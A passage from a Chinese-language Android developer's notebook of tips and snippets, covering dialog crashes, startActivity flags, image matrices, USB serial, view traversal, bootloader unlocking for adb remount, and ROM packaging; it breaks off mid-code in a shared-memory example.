android.view.WindowManager$BadTokenException: Unable to add window -- token android.os.BinderProxy@XXX is not valid; is your activity running?

问题根本原因就是由于将要弹出的dialog所要依附的View已经不存在导致的。但是是全局的dialog，由于已经创建过一个AlertDialog且未被销毁，所以不为空，当前传入的上下文也不为空，所以直接可以进入到show()方法，但是当前dialog依附的activity已经销毁了，就直接崩溃了。

解决方法思路：判断AlertDialog是否为空且activity已经isFinishing()，如果AlertDialog 不为空，则需要判断 Activity 是否切换。

最后，如果 Activity 切换了，那么就需要创建新的 ，否则复用 之前的。

但是如何判断activity是否切换呢?

找到

if (activity.getClass().equals(Activity_Main.class)){
    //两个activity相等，写逻辑
}
没试过这种，但是Object对象比较，内部属性比较太繁琐了，果断舍弃。
后来采用了
activity.getClass().getName()
但是，名字虽然一样了 ，但是，实际上我销毁当前和再重新进入，名字还是一样的，但是activity已经不一样了，鬼都知道不一样了啊，以为前一个我已经销毁了，当前是我重新进入的，能一样吗?
可是，这个getName()，名字是一样的 ，没办法，不能用，后来无意中发现
打印activity的时候，发现@后面有一个特别的字符，经过多次尝试发现这个是唯一的，就用了这个。（别告诉我你不知道怎么把Object转为String）
关于Context强转Activity，请查看 https://mp.csdn.net/postedit/103562959
```

## Activity 上下文之外启动 Activity 注意的地方

```text
我们可以看到 Activity、Application、Service 都是 context 的间接子类。
在Context中，定义了startActivity方法

public abstract void startActivity(Intent intent);
ContextWrapper继承覆盖了这个方法

@Override
public void startActivity(Intent intent) {
    mBase.startActivity(intent);
}
mBase是一个ContextImpl对象。
再到ContextImpl类中的startActivity（）看源码：

@Override
public void startActivity(Intent intent, Bundle options) {
    warnIfCallingFromSystemProcess();
    //这里判断是否设置Intent.FLAG_ACTIVITY_NEW_TASK,不设置则抛出异常
    if ((intent.getFlags()&Intent.FLAG_ACTIVITY_NEW_TASK) == 0) {
        throw new AndroidRuntimeException(
                "Calling startActivity() from outside of an Activity "
                + " context requires the FLAG_ACTIVITY_NEW_TASK flag."
                + " Is this really what you want?");
    }
    mMainThread.getInstrumentation().execStartActivity(
            getOuterContext(), mMainThread.getApplicationThread(), null,
            (Activity) null, intent, -1, options);
}
而我们在使用Application、Service作为上下文环境启动activity时最后就是执行到ContextImpl类中的startActivity（）方法，因此如何不设置intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);则抛出异常。那为什么在activity中启动activity不会抛出异常呢?我们接着来看activity的源码：

@Override
public void startActivity(Intent intent) {
    this.startActivity(intent, null);
}
@Override
public void startActivity(Intent intent, @Nullable Bundle options) {
    if (options != null) {
        startActivityForResult(intent, -1, options);
    } else {
        // Note we want to go through this call for compatibility with
        // applications that may have overridden the method.
        startActivityForResult(intent, -1);
    }
}

public void startActivityForResult(Intent intent, int requestCode, @Nullable Bundle options) {
    if (mParent == null) {
        Instrumentation.ActivityResult ar =
            mInstrumentation.execStartActivity(
                this, mMainThread.getApplicationThread(), mToken, this,
                intent, requestCode, options);

}
因为 Activity 重写了父类的 startActivity() 去掉了判断
```

## [图片] 图像处理-使用Matrix操作图片

```text
<ImageView
    android:src="@drawable/hhh"
    android:id="@+id/image"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:scaleType="matrix"/>

//缩放
float scale = Float.parseFloat(et_scale.getText().toString());
scaleBitmap(imageView,scale,scale);

//旋转
float degree = Float.parseFloat(et_rotate.getText().toString());
rotateBitmap(imageView, degree);

//移动
float X = Float.parseFloat(et_move_X.getText().toString());
float Y = Float.parseFloat(et_move_Y.getText().toString());
moveBitmap(imageView,X,Y);

//重置matrix
resetBitmap(imageView);

public void scaleBitmap(ImageView imageView, Float scale_X,Float scale_Y) {
    matrix.postScale(scale_X, scale_Y);
    imageView.setImageMatrix(matrix);
}

/***
 * 旋转图像
 * @param imageView 需要旋转的图像
 * @param degree 旋转的角度
 */
public void rotateBitmap(ImageView imageView, Float degree) {
    matrix.postRotate(degree);
    imageView.setImageMatrix(matrix);
}

/***
 * 移动图像
 * @param imageView 需要移动的图像
 * @param X X-轴的偏移量
 * @param Y Y-轴的偏移量
 */
public void moveBitmap(ImageView imageView, float X, float Y) {
    matrix.postTranslate(X, Y);
    imageView.setImageMatrix(matrix);
}

/***
 * 重置图像
 * @param imageView 需要重置的图像
 */
public void resetBitmap(ImageView imageView) {
    matrix.reset();
    imageView.setImageMatrix(matrix);
}
```

## Android中的USB转串口通信

```text
步骤如下：
1、查找设备
2、权限判断，没有权限时请求权限
3、连接通信

代码如下：
private void initUsbSerial() {
    // 1.查找设备
    usbManager = (UsbManager) getSystemService(Context.USB_SERVICE);

    drivers = UsbSerialProber.getDefaultProber().findAllDrivers(usbManager);

    if (drivers.size() <= 0) {
        Toast.makeText(this, "无串口设备", Toast.LENGTH_SHORT).show();
        return;
    }

    UsbDevice device = drivers.get(0).getDevice();

    //权限判断
    if (usbManager.hasPermission(device)) {
        permissionAllow(device);
    } else {
        Log.e("TAG", "没有权限");
        //请求权限
        UsbPermissionActionReceiver mUsbPermissionActionReceiver = new UsbPermissionActionReceiver();
        Intent intent = new Intent(ACTION_USB_PERMISSION);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(this, 0, intent, 0);
        IntentFilter intentFilter = new IntentFilter(ACTION_USB_PERMISSION);
        registerReceiver(mUsbPermissionActionReceiver, intentFilter);
        usbManager.requestPermission(device, pendingIntent);
    }
}
private void permissionAllow(UsbDevice device) {
    List<UsbSerialPort> result = new ArrayList<>();

    for (final UsbSerialDriver driver : drivers) {
        final List<UsbSerialPort> ports = driver.getPorts();
        result.addAll(ports);
    }

    UsbDeviceConnection usbDeviceConnection = usbManager.openDevice(device);

    try {
        serialPort = result.get(0);
        serialPort.open(usbDeviceConnection);
        //int baudRate, int dataBits, int stopBits, int parity
        serialPort.setParameters(38400, 8, 1, 2);
    } catch (IOException e) {
        e.printStackTrace();
    }

    UsbInterface anInterface = device.getInterface(0);

    if (anInterface == null) {
        Toast.makeText(this, "初始化失败", Toast.LENGTH_SHORT).show();
        return;
    }

    // 判断端口号
    for (int i = 0; i < anInterface.getEndpointCount(); i++) {
        UsbEndpoint endpoint = anInterface.getEndpoint(i);
        if (endpoint.getType() == UsbConstants.USB_ENDPOINT_XFER_BULK) {
            if (endpoint.getDirection() == UsbConstants.USB_DIR_IN) {
                // 输入端口
                usbEndpointIn = endpoint;
            } else if (endpoint.getDirection() == UsbConstants.USB_DIR_OUT) {
                // 输出端口
                usbEndpointOut = endpoint;
            }
        }
    }
}

private class UsbPermissionActionReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (ACTION_USB_PERMISSION.equals(action)) {
            synchronized (this) {
                UsbDevice usbDevice = intent.getParcelableExtra(UsbManager.EXTRA_DEVICE);
                if (intent.getBooleanExtra(UsbManager.EXTRA_PERMISSION_GRANTED, false)) {
                    // user choose YES for your previously popup window asking for grant perssion for this usb device
                    if (null != usbDevice) {
                        permissionAllow(usbDevice);
                    }
                } else {
                    //user choose NO for your previously popup window asking for grant perssion for this usb device
                    Toast.makeText(context, String.valueOf("Permission denied for device" + usbDevice), Toast.LENGTH_LONG).show();
                }
            }
        }
    }
}
```

## [Snippet] 获取应用第一次安装日期

```text
public static long getAppFirstInstallTime(Context context, String packageName) {
    long lastUpdateTime = 0;
    try {
        PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, 0);
        lastUpdateTime = packageInfo.firstInstallTime;
    } catch (PackageManager.NameNotFoundException e) {
        e.printStackTrace();
    }
    return lastUpdateTime;
}
```

## [Snippet] 获取应用更新日期

```text
public static long getAppLastUpdateTime(Context context, String packageName) {
    long lastUpdateTime = 0;
    try {
        PackageInfo packageInfo = context.getPackageManager().getPackageInfo(packageName, 0);
        lastUpdateTime = packageInfo.lastUpdateTime;
    } catch (PackageManager.NameNotFoundException e) {
        e.printStackTrace();
    }
    return lastUpdateTime;
}
```

## [Snippet] 获取应用的安装市场

```text
public static String getAppInstaller(Context context, String packageName) {
    return context.getPackageManager().getInstallerPackageName(packageName);
}
```

## FAQ21898 : Google Dialer V28 and V29 crashed when booting

```text
问题分析:
java.lang.RuntimeException: Unable to create application com.google.android.apps.dialer.application.GoogleDialerApplication: java.lang.SecurityException: Failed to find provider call_log for user 0; expected to find a valid ContentProvider for this authority
解决方案:
/vendor/mediatek/proprietary/packages/providers/ContactsProvider/AndroidManifest.xml
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
package="com.android.providers.contacts"
coreApp="true" //add
android:sharedUserId="android.uid.shared"
android:sharedUserLabel="@string/sharedUserLabel">
```

## [Dialer]  [FAQ02940] 如何获取通话时间长度

```text
通话时间会保存在GsmConnection中，一般我们希望在电话结束时来显示本次电话的时间。
我们调用其中的 getDurationMillis()方法来获取到本次通话的时间，这个方法会返回一个long int的数，单位为ms，为了比较好地显示出时间，我们可以对这个返回值做一些处理。
例如：
我们可以写一个方法作为接口来处理这个时间并很好地显示出来：
```

## [Tool] Meta tool 有两种类型

```text
一种是 MAUI Meta Tool, 用来读和修改modem 的nvram 数据。
另一种是 SP_META, 用来读和修改android app 端的nvram 数据.
```

## [算法] BFS广度优先搜索算法遍历树(使用队列的先进先出来实现 LinkedList)

```text
https://blog.csdn.net/Coo123_/article/details/99944361

fun breadthFirst(root :View){
    val viewDeque = LinkedList<View>()
    var view = root
    viewDeque.push(view)
    while (!viewDeque.isEmpty()){
        view = viewDeque.poll()
        printView(view)
        if(view is ViewGroup){
            for(childIndex in 0 until view.childCount){
                val childView = view.getChildAt(childIndex)
                viewDeque.addLast(childView)
            }
        }
    }
}
```

## [算法] DFS深度优先搜索算法遍历树

```text
fun depthFirst(root :View){
    val viewDeque = LinkedList<View>()
    var view = root
    viewDeque.push(view)
    while (!viewDeque.isEmpty()){
        view = viewDeque.pop()
        printView(view)
        if(view is ViewGroup){
            for(childIndex in 0 until view.childCount){
                val childView = view.getChildAt(childIndex)
                viewDeque.push(childView)
            }
        }
    }
}
```

## [知识点] JVM栈祯

```text
简单来说，每启动一个线程，JVM 都会为其分配一个 Java 栈，每调用一个方法，都会被封装成一个栈帧，进行压栈操作，当方法执行完成之后，又会执行弹栈操作。而每个栈帧中，当前调用的方法的一些局部变量、动态连接，以及返回地址等数据。
```

## Android应用App启动白屏（黑屏）问题解决

```text
本篇记录Android 开发常见的一个优化点：冷启动优化。冷启动也就是应用本来没有启动，这时我们点击桌面图标或者使用adb启动应用。
问题：我们在桌面点击某些app图标时会感觉卡顿了一下才弹出app启动页，或者启动时先白屏或黑屏一会才显示启动页。这样给用户的体验不太好。

优化方法1：
    定义一个启动页专用的主题:
<style name="AppStartTheme" parent="Theme.AppCompat.Light.NoActionBar">
    <item name="android:windowIsTranslucent">true</item>
    <item name="android:windowFullscreen">true</item>
    <item name="android:windowBackground">@android:color/transparent</item> 
</style>
这样启动时会给启动页一个透明的主题，可以解决启动时先白屏或黑屏一会才显示启动页。但是还是会有一点卡顿的效果。可以把应用的一些非必须的初始化做延迟处理。不要在application和启动页的oncreate中做太多的耗时操作。

启动时间测试方法：adb shell am start -W packageName/IndexActivity  替换自己的包名和启动页

优化方法2：
给启动页设置一个图片做主题，这个图片就是app启动页背景图:可以直接使用图片，也可以使用layer-list形式的布局。推荐使用layer-list，屏幕适配好。
<style name="AppStartTheme" parent="Theme.AppCompat.Light.NoActionBar">
    <!--冷启动时间更慢 但是点击图标是立即打开视觉效果-->
    <item name="android:windowFullscreen">true</item>
    <item name="android:windowBackground">@drawable/index1</item>
</style>
在启动页的onCreate中不要再设置contentview，只使用主题中背景图片。这种方法使用adb测试启动时间比方法1要耗时多，但是点击图标是立即打开的效果，没有卡顿也不会有白屏和黑屏。市场上一些秒开的app也是这么做的。
```

## [图片] android:scaleType

```text
1、scaleType="matrix"                保持原图大小、从左上角的点开始，以矩阵形式绘图。
2、scaleType="fitXY"                 将原图进行横方向（即XY方向）的拉伸后绘制的。
3、scaleType="fitStart"              将原图沿左上角的点（即matrix方式绘图开始的点），按比例缩放原图绘制而成的。
4、scaleType="fitCenter"             将原图沿上方居中的点（即matrix方式绘图第一行的居中的点），按比例缩放原图绘制而成的。
5、scaleType="fitEnd"                将原图沿下方居中的点（即matrix方式绘图最后一行的居中的点），按比例缩放原图绘制而成的。
6、scaleType="center"                保持原图大小，以原图的几何中心点和ImagView的几何中心点为基准，只绘制ImagView大小的图像。
7、scaleType="centerCrop"            不保持原图大小，以原图的几何中心点和ImagView的几何中心点为基准，只绘制ImagView大小的图像（以填满ImagView为目标，对原图进行裁剪）。
8、scaleType="centerInside"          不保持原图大小，以原图的几何中心点和ImagView的几何中心点为基准，只绘制ImagView大小的图像（以显示完整图片为目标，对原图进行缩放）。
```

## 聊聊真实的 Android TV 开发技术栈

```text
https://blog.csdn.net/Coo123_/article/details/89496405

https://blog.csdn.net/sk719887916?t=1

https://blog.csdn.net/jun5753/article/details/78662918

Android TV google官方TV库
https://github.com/googlesamples/leanback-showcase

智能电视，电视盒子开发SDK
https://github.com/boxmate/tvframe

选中框切换动画，适用于电视
https://github.com/EZJasonBoy/FocusChangeAnimation

仿泰捷视频最新TV版 Metro UI效果. 仿腾讯视频TV版(云视听•极光) 列表页
https://github.com/hejunlin2013/TVSample

tv常用效果控件，包括焦点、边框处理等
https://github.com/evilbinary/Tvwidget

欢社区（已失效）
http://bbs.tvhuan.com/forum.php?gid=37

Android tv，盒子，投影仪 控件
https://github.com/FrozenFreeFall/Android-tv-widget

TV 项目常用工具(焦点问题，适配问题等.)
https://github.com/genius158/TVProjectUtils
```

## [Snippet] 焦点放大处理

```text
在RecyclerView中的item可以这样操作，比如焦点选中时放大，失去焦点后还原：
holder.itemView.setOnFocusChangeListener(new View.OnFocusChangeListener() {
    @Override
    public void onFocusChange(View v, boolean hasFocus) {
        if (hasFocus) {    
            holder.itemView.animate().scaleX(1.05f).scaleY(1.2f).setDuration(300).start();
        } else {
            holder.itemView.animate().scaleX(1.0f).scaleY(1.0f).setDuration(300).start();
        }
    }
});
```

## 怎么学习编程

```text
https://blog.csdn.net/sk719887916/article/details/103396259
```

## 字符串拼接的几种方法

```text
有人把Java中使用+拼接字符串的功能理解为运算符重载。其实并不是，Java是不支持运算符重载的。这其实只是Java提供的一个语法糖。后面再详细介绍。

**运算符重载：**在计算机程序设计中，运算符重载（英语：operator overloading）是多态的一种。运算符重载，就是对已有的运算符重新进行定义，赋予其另一种功能，以适应不同的数据类型。

**语法糖：**语法糖（Syntactic sugar），也译为糖衣语法，是由英国计算机科学家彼得·兰丁发明的一个术语，指计算机语言中添加的某种语法，这种语法对语言的功能没有影响，但是更方便程序员使用。语法糖让程序更加简洁，有更高的可读性。

**3、concat **
除了使用+拼接字符串之外，还可以使用String类中的方法concat方法来拼接字符串。如：

4、StringBuffer

关于字符串，Java中除了定义了一个可以用来定义字符串常量的String类以外，还提供了可以用来定义字符串变量的StringBuffer类，它的对象是可以扩充和修改的。

使用StringBuffer可以方便的对字符串进行拼接。如：

**5、StringBuilder **
除了StringBuffer以外，还有一个类StringBuilder也可以使用，其用法和StringBuffer类似。如：

**6、StringUtils.join **
除了JDK中内置的字符串拼接方法，还可以使用一些开源类库中提供的字符串拼接方法名，如apache.commons中提供的StringUtils类，其中的join方法可以拼接字符串。

这里简单说一下，StringUtils中提供的join方法，最主要的功能是：将数组或集合以某拼接符拼接到一起形成新的字符串，如：

并且，Java8中的String类中也提供了一个静态的join方法，用法和StringUtils.join类似。

以上就是比较常用的五种在Java种拼接字符串的方式，那么到底哪种更好用呢?为什么阿里巴巴Java开发手册中不建议在循环体中使用+进行字符串拼接呢?

循环体内，字符串的连接方式，使用 StringBuilder 的 append 方法进行扩展。而不要使用+。

1、如果不是在循环体中进行字符串拼接的话，直接使用+就好了。

2、如果在并发场景中进行字符串拼接的话，要使用StringBuffer来代替StringBuilder。
```

## Android多线程总结

```text
https://blog.csdn.net/Coo123_/article/details/88236941
```

## [Snippet] ViewUtil

```text
public final class ViewUtil {
 private ViewGroup view;
 private static Context context;
 /** instance */
 private static ViewUtil sInstance;
 private ViewUtil(ViewGroup view) {
  this.view = view;
  this.context =view.getContext();
 }

 /**
  * @return instance
  */
 public static synchronized ViewUtil getInstance(ViewGroup view) {
  if (sInstance == null) {
   sInstance = new ViewUtil(view);
  }
  return sInstance;
 }

 /**
     * get Onclicked ItemView
     * 在重写ViewGroup使用
     * 
     * @param X
     * @param Y
     * @return getView
     */
    public static View getViewAtActivity(int x, int y) {
        // 从Activity里获取容器
        View root =((Activity)context).getWindow().getDecorView();
        return findViewByXY(root, x, y);
    }

    /**
     * get Onclicked ItemView
     * 在重写ViewGroup使用
     * 
     * @param X
     * @param Y
     * @return getView
     */
    public View getViewAtViewGroup(int x, int y) {
        return findViewByXY(view, x, y);
    }

    /**
     * @param view
     * @param x
     * @param y
     * @return
     */
    private static View findViewByXY(View view, int x, int y) {
        View targetView = null;
        if (view instanceof ViewGroup) {
            // 父容器,遍历子控件
            ViewGroup v = (ViewGroup) view;
            for (int i = 0; i < v.getChildCount(); i++) {
                targetView = findViewByXY(v.getChildAt(i), x, y);
                if (targetView != null) {
                    break;
                }
            }
        } else {
            targetView = getTouchTarget(view, x, y);
        }
        return targetView;
    }

    /**
     * @param view
     * @param x
     * @param y
     * @return
     */
    private static View getTouchTarget(View view, int x, int y) {
        View targetView = null;
        ArrayList<View> TouchableViews = view.getTouchables();
        for (View child : TouchableViews) {
            if (isTouchPointInView(child, x, y)) {
                targetView = child;
                break;
            }
        }
        return targetView;
    }
    /**
     * 判断view是否可以聚焦
     * @param view
     * @param x
     * @param y
     * @return
     */
    private static boolean isTouchPointInView(View view, int x, int y) {
        int[]  location = new int[2] ;
        view.getLocationOnScreen(location);
        int left = location[0] ;
        int top = location[1] ;
        int right = left + view.getMeasuredWidth();
        int bottom = top + view.getMeasuredHeight();
        if (view.isClickable() && y >= top && y <= bottom && x >= left && x <= right) {
            return true;
        }
        return false;
    }
}
```

## [反射] setAccessible(true) 提高反射效率

```text
https://blog.csdn.net/jdsjlzx/article/details/7488566

实际上 setAccessible 是启用和禁用访问安全检查的开关,并不是为true就能访问为false就不能访问 

由于JDK的安全检查耗时较多.所以通过setAccessible(true)的方式关闭安全检查就可以达到提升反射速度的目的 
```

## OAID 实现步骤

```text
1.把 miit_mdid_1.0.10.aar 拷贝到 libs 目录下
2.把 supplierconfig.json 拷贝到 assets 目录下
3.在 app.gradle 中添加依赖 implementation files('miit_mdid_1.0.10.aar')
4.添加 MyApplication.java
public class MyApplication extends Application {
    protected void attachBaseContext(Context base) {
        super.attachBaseContext(base);
        JLibrary.InitEntry(base);
    }
}
```

## P平台之后fastboot加密后adb无法push问题解决方案----需要解锁bootloader

```text
在android P版本上如果按照“FAQ18076 android 6.0 M userdebug版本执行adb remount失败”的做法在userdebug版本上执行adb remount会提示以下错误：
remount of the / superblock failed: Permission denied
remount failed
     原因是android P版本后google启用avb(Android Verified Boot)2.0，verified boot and DM-verity默认启用策略发生了变化。详情如下：
DM-Verity behavior changes from vboot1.0 to avb2.0.
On vboot1.0, dm-verity is turned off on eng build and is enabled on userdebug/user build.
DM-verity could be disabled with adb (not fastboot) on userdebug build without unlocking device first.
DM-Verity could not be disabled on user build.
On avb2.0, dm-verity behavior are the same on all build variants.
It's turned on by default and could only be disabled after device is unlocked.
dm-verity disable flag is moved from system image dm-verity metadata(vboot1.0) to vbmeta image(avb2.0), and you have two ways to disable it: adb and fastboot.
解决方案（重点关注黄色字体，执行命令过程中可能会遇到的问题的解法）：
- go to setting -> system -> Developer options -> OEM unlocking（ps:如果发现 OEM unlocking不能打开，需要将MTK_SEC_FASTBOOT_UNLOCK_SUPPORT这个宏改成yes。）
- adb reboot bootloader
- fastboot flashing unlock（ps,可能会识别不到设备，需要将SDK环境更新到最新）
- press volume up key（ps.音量上键不起作用的话需要找驱动修改）
- fastboot reboot
- adb root
- adb disable-verity
- adb reboot
- adb root
- adb remount


如何确认 bootloader unlock 解锁成功

1、fastboot 模式下按音量上键后是否提示 Unlock Pass…return to fastboot in 3s

2、fastboot 模式下 fastboot getvar unlocked，是否显示 unlocked: yes

3、重启后界面是否显示
orange state
Your deivce has been unlocked and can’t be trusted
your device will boot in 5 seconds

4、解锁成功后检查这两个属性会从
[ro.boot.flash.locked] : [1] 
[ro.boot.verifiedbootstate] : [green] 
变成
[ro.boot.flash.locked] : [0] 
[ro.boot.verifiedbootstate] : [orange] 
```

## [Snippet] android View 绘制完成监听

```text
view.getViewTreeObserver().addOnDrawListener(new OnDrawListener() {
 @Override
 public void onDraw() {
 }
});
```

## [Snippet] 获取 TextView 一行最多能显示几个字

```text
/**
 * 获取textview最大能显示几个字
 * @param text 文本内容
 * @param size 文本字体大小
 * @param maxWidth textview的最大宽度
 * @return
 */
private float getLineMaxNumber(String text, float size,float maxWidth) {
    if (null == text || "".equals(text)){
        return 0;
    }
    Paint paint = new Paint();
    paint.setTextSize(size);
    //得到文本内容总体长度
    float textWidth = paint.measureText(text);
    // textWidth
    float width = textWidth / text.length();
    float total = maxWidth / width;
    return total;
}
```

## [Snippet] 让某个 EditText 默认不获取焦点

```text
在实际项目中，有时候不想让某个EditText控件获取焦点，可以如下配置：

android:focusableInTouchMode="false"
如果后来再需要，可以做触摸该控件的时候setFocusableInTouchMode(true)即可，如下代码所示：

editText.setOnTouchListener(new View.OnTouchListener() {
    @Override
    public boolean onTouch(View v, MotionEvent event) {
        editText.setFocusableInTouchMode(true);
        return false;
    }
});
```

## [Snippet] Android 5.0以上版本去掉 Button 自带阴影效果的方法

```text
<Button
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="@string/button_send"
    android:onClick="sendMessage"
    style="?android:attr/borderlessButtonStyle" />
```

## [Snippet] 如何修改 NavigationBar 的颜色???

```text
getWindow().setNavigationBarColor(Color.BLUE); //写法一
getWindow().setNavigationBarColor(getResources().getColor(R.color.black_12));//写法二
```

## [Snippet] 如何查看反编译出来的颜色16进制码?

```text
//反编译 Camera 代码看到
activity.getWindow().setNavigationBarColor(-16777216);  // ff000000 黑色
activity.getWindow().setNavigationBarColor(-1);         // ffffffff 白色
activity.getWindow().setNavigationBarColor(0);          // 00000000 透明

System.out.println(Integer.toHexString(-16777216));     // ff000000 黑色
```

## [图片] drawable 与 mipmap 的区别（android资源文件放置位置）

```text
今天在网上浏览博客，看到这一个问题，我们的图片资源到底放在drawable还是mipmap目录中，网上的争议很大，
今天打算就我的观点说一下这个问题，如果我的回答让大神们有所质疑,希望多多提点。
首先我们应该知道他们的意义：
1.Drawable
Android 把可绘制的对象抽象为Drawable,不同的图形图像代表着不同的 drawable 类型，
通常我们在代码中不会直接接触drawable实现类的，是由android FrameWork提供了一些
具体的drawable的实现。
我们在实际开发中，会把drawable的资源放在res/drawable目录上，当需要使用图片资源时
可以通过@drawable或者id引入这些drawable资源
drawable是默认共享的，不同的地方使用了相同资源drawable，他们会指向相同的资源，相同
的状态，如果drawable被修改了，其他都被修改了，

2.mipmap(MIP map是一种电脑图形图像技术，用于在三维图像的二维代替物中达到立体感效果)
在使用android Studio 创建项目的时候，常常会看到系统吧ic_launcher.png图片放在mipmap-xxhdpi
目录下，mip来源于拉丁文中的mulium in parvo 意为在一个小空间的多数，MIP map是一种电脑图形图像技术，用于在三维图像的二维代替物中达到立体感效果
mipmap目录的图标会忽略屏幕密度，回去匹配大一点的，然后系统自动对图片进行缩放，从而优化显示和节省资源。官方建议如下类型的图片资源放在mipmap目录：
launcher icons
action bar and tab icons
Notification icons

3.针对于drawable 与 mipmap都有了一定的认识，那么我们在实际开发中，到底把图片资源放在drawable下还是mipmap下?
答案：mipmap文件夹方应用图标，其实需要使用drawable资源像之前一样对应的放到drawable文件夹，
根据这篇google的博文： 
It’s best practice to place your app icons in mipmap- folders (not the drawable- folders) because they are used at resolutions different from the device’s current density. 
应用的启动图标最好放到mipmap文件夹(不是drawable文件夹)，因为它们用在不同分辨率的设备上。 
When referencing the mipmap- folders ensure you are using the following reference: 
当引用mipmap文件夹的资源时，需要使用下面的方式：
android:icon="@mipmap/ic_launcher"
结论： 
mipmap仅仅用于应用启动图标，可以根据不同分辨率进行优化。其他的图标资源，还是要放到drawable文件夹中。

Android 官方解释[3] ：
Note: You should place all launcher icons in the res/mipmap-[density] / folders, rather than drawable/ folders to ensure launcher apps use the best resolution icon. 
注意：你应当将虽有启动图标放到res/mipmap-[density] /文件夹中，而不是drawable/文件夹，来确保启动图片使用最好的分辨率图标。

在网上查阅两道面试题，希望能加深一下大家的印象:
Android资源目录的读取顺序?
Android资源文件可以定义在不同分辨率、屏幕方向、语言等（甚至还有夜间模式），当我们的应用需要使用一个资源，这个资源（图片、Layout或者别的）可能在很多res下的子目录中都存在，那么Android系统是如何确认使用哪一个资源呢?
这就是一个Android应用的资源查找的顺序问题，其实简单说，在查找时会先去掉有冲突的资源目录（上图第1步），然后再按MCC、MNC、语言等指定的优先级进行查找，直到确认一个匹配资源。根据屏幕尺寸限定符选择资源时，如果没有更好的匹配资源，则系统将使用专为小于当前屏幕的屏幕而设计的资源。
图片放错目录会产生的问题吗?
这一点可能很多人都不会注意，觉得只要往一个drawable目录中放了需要的资源就好了。而我们可以自己做一个简单的测试，把同一个图片资源放在不同的dpi目录，会发现它们使用的内存是不一样的。简单说就是高密度（density）的系统去使用低密度目录下的图片资源时，会将图片长宽自动放大以去适应高密度的精度，当然图片占用的内存会更大。
所以如果能提各种dpi的对应资源那是最好，可以达到较好内存使用效果。如果提供的图片资源有限，那么图片资源应该尽量放在高密度文件夹下，这样可以节省图片的内存开支。
```

## NFC相关(Android--NFC读写)

```text
https://blog.csdn.net/chaoyu168/article/details/98038569
```

## Android--EditText、TextView 的 drawableRight 和 drawableLeft 的点击事件

```text
et.setOnTouchListener(new OnTouchListener() {
    @Override
    public boolean onTouch(View v, MotionEvent event) {
        // et.getCompoundDrawables()得到一个长度为4的数组，分别表示左右上下四张图片
        Drawable drawable = et.getCompoundDrawables()[2] ;
        //如果右边没有图片，不再处理
        if (drawable == null) {
            return false;
        }
        //如果不是按下事件，不再处理
        if (event.getAction() != MotionEvent.ACTION_UP) {
            return false;
        }
        if (event.getX() > et.getWidth() - et.getPaddingRight() - drawable.getIntrinsicWidth()) {
   //隐藏软键盘
            v.setFocusableInTouchMode(false);
            v.setFocusable(false);
   HideKeyboard();
            //do something
        } else {
            v.setFocusableInTouchMode(true);
            v.setFocusable(true);
            return false;
        }
    }
});
```

## ROM包制作

```text
1.下载喜欢的rom当底子，解压得到几个文件夹
2.system\app里是集成软件，该删的删，该加的加。注意，包里的文件不可以出现非英文字符。[删的时候注意别把系统基本应用给干掉了，不确定的建议保留]  ，font文件夹里的字体也可以修改， [铃声也是随便删。留个默认就行了]  完了压缩成zip，命名为update.zip
      [提醒一下，压缩时要保证ZIP下直接就是文件夹system、META-INF和文件boot.img，中间不要有中间一层，我开始时错误地弄得ZIP里是update文件夹，然后里面才那三个东西，导致不能刷机] 

3.下载auto-sign [http://download.csdn.net/download/chaoyu168/10269331] ，这是签名工具，要注意的是这个工具要在java环境下运行

4，在电脑上安装JAVA，并配置JAVA环境。参考http://www.lurenjia.net/tech/java_learning_1.html ，有详细的步骤，菜鸟可以一步步照做，连文件名，安装路径都一样

5.解压auto-sign， [随便放在你电脑里，只要你找得到]  把update.zip拖到AUTO-SIGN文件夹里，就是和sign.bat这个在一个文件夹，然后双击sign.bat，要等，一直等到CMD那个黑框里提示complete,按任意键继续。这时多出个update_signed.zip，这就是你新的rom了。

添加自己的APP：

1.对于4.4系统的手机，如果要打入apk到system区，只需将apk复制到system/app下，对应apk的lib文件（.so文件）复制到system/lib下即可；如果要打入apk到userdata区，只需将apk复制到userdata/app下即可。

2.对于5.0及以上系统的手机，如果要打入apk到system区，需要将apk及对应的lib文件建在同一目录下（将apk用好压打开，将lib压缩到指定文件夹，然后和app一起放入命名的文件夹），然后复制到system/app下（具体查看system/app下其他apk的目录格式），并且，在实践中，有的手机需要打入到system/framework中apk才能正常运行，不然闪退；如果需要打入apk到userdata区，同样只需将apk复制到userdata/app下即可。

3.
ROM修改完成以后就需要打包
同样用WINRAR
同时选择 如果还有其他文件夹一样选择【压缩时要保证ZIP下直接就是文件夹system、META-INF和文件boot.img，中间不要有中间一层】
```

## Android--合并2个Xml

```text
https://blog.csdn.net/chaoyu168/article/details/70227837
```

## android匿名共享内存ASM(Anonymous Shared Memory)

```text
https://blog.csdn.net/hello_java_Android/article/details/88051264
https://blog.csdn.net/hello_java_Android/article/details/88101047
https://blog.csdn.net/hello_java_Android/article/details/88129890

Android系统的IPC方式通常为：文件、socket、binder、messenger、AIDL、ContentProvider,此外还有个Anonymous Shared Memory（匿名共享内存），这篇文章介绍Ashm基础使用相关知识。

Android api27加入了SharedMemory类，27之前需要通过反射去拿到文件描述符。

demo为MainActivity和一个远程服务（指定了process的service）之间的通信，步骤如下：

1、创建aidl文件IMemoryAidlInterface

interface IMemoryAidlInterface {
   ParcelFileDescriptor getParcelFileDescriptor();
}
1、创建一个服务并在manifest文件中指定process

public class MemoryFetchService extends Service {
    private static final String TAG = "MemoryFetchService";
    private static final String SHM_FILE_NAME = "test_memory";
    @Override
    public IBinder onBind(Intent intent) {
        return new MemoryFetchStub();
    }
    static class MemoryFetchStub extends IMemoryAidlInterface.Stub {
        @Override
        public ParcelFileDescriptor getParcelFileDescriptor() throws RemoteException {
            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O_MR1) {
                MemoryFile memoryFile = null;
                try {
                    memoryFile = new MemoryFile(SHM_FILE_NAME, 1024);
                    memoryFile.getOutputStream().write(new byte[] {1, 2, 3, 4, 5});
                    Method method = MemoryFile.class.getDeclaredMethod("getFileDescriptor");
                    FileDescriptor des = (FileDescriptor) method.invoke(memoryFile);
